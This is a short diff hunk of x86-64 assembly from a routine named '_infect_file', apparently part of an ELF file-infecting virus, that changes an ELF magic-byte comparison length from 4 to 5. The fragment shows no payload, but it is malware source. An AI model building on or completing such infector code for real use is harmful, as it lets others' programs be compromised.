@@ -361,7 +361,7 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
-	push 4
+	push 5
 	pop rdx
 	call _ft_memcmp
 	push rsi
